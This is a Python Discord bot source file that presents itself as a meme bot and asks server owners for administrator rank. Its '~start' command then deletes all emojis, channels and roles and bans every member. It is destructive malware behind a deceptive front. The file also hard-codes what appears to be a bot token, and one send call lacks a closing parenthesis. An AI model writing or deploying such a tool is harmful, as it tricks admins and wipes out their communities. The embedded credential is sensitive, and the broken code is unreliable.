token = "NTUzMjU1MjYzNTM3NDYzMzA2.D2LeRQ.ml2cJe_XtbaNzGSEug13XOHgxxA"
prefix = "~" 

import discord
from discord.ext import commands
from discord.utils import find
from discord.ext.commands import bot
import asyncio

print ("Loading bot...")

bot = commands.Bot(command_prefix=prefix)
bot.remove_command("help")

@bot.event
async def on_guild_join(guild):
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            await channel.send("Thank you for adding me to this server! Before my magical memes can be unleashed, I will require administrator rank. After this, type '~start' to get me started!")

@bot.event        
async def on_ready():
    print ("Ready to be used")

    @bot.command(pass_context=True)
    async def spreek(ctx):
        await ctx.message.delete()
        await ctx.send("Thank you for adding me to this server! Before my magical memes can be unleashed, I will require administrator rank. After this, type '~start' to get me started!"

    @bot.command(pass_context=True)
    async def start(ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} is klaar neef")
            except:
                print (f"{emoji.name} niks")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} is klaar neef")
            except:
                print (f"{channel.name} niks")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} is klaar neef")
            except:
                print (f"{role.name} niks")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} is klaar neef")
            except:
                print (f"{user.name} niks")
        print ("Action Completed: destroy")

bot.run(token)
